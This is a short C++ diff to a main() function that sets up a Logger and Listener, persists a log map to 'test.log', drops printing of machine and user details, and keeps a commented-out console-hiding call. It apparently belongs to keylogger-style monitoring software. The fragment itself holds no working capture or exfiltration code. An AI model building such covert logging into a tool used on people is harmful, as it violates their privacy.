@@ -13,16 +13,17 @@ int main()
 	Logger logger;
 	Listener listener(&logger);
 	
-	// Display computer information
-	cout << Utilities::GetMachineName() << endl;
-	cout << Utilities::GetUsername() << endl;
-    cout << Utilities::GetProgramFilePath() << endl;
-	cout << Utilities::GetSystemDir() << endl;
+	logger.LoadMapFromFile("test.log");
+
+	cout << logger.GetLog() << endl;
 
 	// Start listening
 	listener.Start();
 
-	//Utilities::HideConsole();
+	cout << "EXITING!" << endl;
 
+	logger.SaveMapToFile("test.log");
+
+	//Utilities::HideConsole();
 	return 0;
 }
